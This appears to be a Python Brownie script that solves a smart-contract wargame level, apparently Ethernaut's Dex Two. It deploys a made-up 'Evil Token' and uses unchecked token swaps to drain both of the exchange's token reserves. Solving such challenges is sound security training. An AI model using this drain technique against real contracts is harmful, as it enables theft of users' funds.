from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    evil_token = SwappableTokenTwo.deploy(instance, 'Evil Token', 'EVIL', 10000, {'from': player})
    evil_token.transfer(instance, 100, {'from': player})

    t1 = SwappableTokenTwo.at(instance.token1())
    t2 = SwappableTokenTwo.at(instance.token2())

    evil_token.approve(player, instance, 300, {'from': player})

    # drain t1 by sending amount = EVIL reserve (100)
    instance.swap(evil_token, t1, 100, {'from': player})

    # drain t2 by sending amount = EVIL reserve (200)
    instance.swap(evil_token, t2, 200, {'from': player})

    print(f'Reserve 1 balance: {t1.balanceOf(instance)}')
    print(f'Reserve 2 balance: {t2.balanceOf(instance)}')
